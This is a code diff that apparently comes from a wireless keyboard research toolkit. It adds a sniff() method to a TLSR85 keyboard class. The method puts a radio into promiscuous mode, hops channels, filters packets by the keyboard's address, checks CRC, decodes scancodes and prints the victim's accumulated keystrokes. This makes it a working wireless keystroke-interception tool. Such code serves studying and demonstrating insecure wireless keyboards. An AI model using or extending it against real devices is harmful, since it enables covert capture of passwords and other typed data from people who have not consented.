@@ -3,16 +3,16 @@ from binascii import unhexlify
 
 from devices.TLSR85.tlsr85 import Tlsr85
 from devices.keyboard import * 
+import time
+from lib import common
 
 
 class Tlsr85Keyboard(Tlsr85):
 
 
     def __init__(self, base_address, keyboard_address, preamble, packet_size, crc_poly, crc_init, crc_size):
-        super().__init__(base_address, crcmod.mkCrcFun(crc_poly, initCrc=crc_init, rev=False, xorOut=0x0000))
+        super().__init__(base_address, base_address + ":" + keyboard_address, preamble, crcmod.mkCrcFun(crc_poly, initCrc=crc_init, rev=False, xorOut=0x0000))
         self.keyboard_address = keyboard_address
-        self.full_address = base_address + ":" + keyboard_address
-        self.preamble = preamble
         self.packet_size = packet_size
         self.crc_size = crc_size
         self.sequence_number = 0
@@ -88,3 +88,33 @@ class Tlsr85Keyboard(Tlsr85):
         array += unhexlify("00" * (6 - len(scancodes)))
         return array
     
+
+    def sniff(self):
+        dwell = 200
+        dwell_time = dwell / 1000
+        channels = self.CHANNELS
+        byte_full_address = unhexlify(self.full_address.replace(':', ''))
+
+        channel_index = 0
+        common.radio.set_channel(channels[channel_index]) # Set channel here to prevent USBError (somehow)
+        common.radio.enter_promiscuous_mode_generic(byte_full_address, rate=self.RATE)
+        last_tune = time.time()
+        entered_string = ""
+
+        while True:
+            # Increment the channel after dwell_time
+            if len(channels) > 1 and time.time() - last_tune > dwell_time:
+                channel_index = (channel_index + 1) % (len(channels))
+                common.radio.set_channel(channels[channel_index])
+                last_tune = time.time()
+
+            value = common.radio.receive_payload()
+            if len(value) >= self.FULL_ADDRESS_LENGTH:
+                found_address = bytes(value[:self.FULL_ADDRESS_LENGTH])
+                if found_address == byte_full_address:            
+                    packet = self.parse_packet(bytes(value))
+                    if self.check_crc(packet["crc"], packet["payload"]):
+                        print(f"TLSR85 Keyboard packet\tCHANNEL : {channels[channel_index]}")
+                        entered_string += self.scancode_to_char(packet["array"], packet["raw_modifiers"])
+                        print(entered_string)
+                        last_tune = time.time()
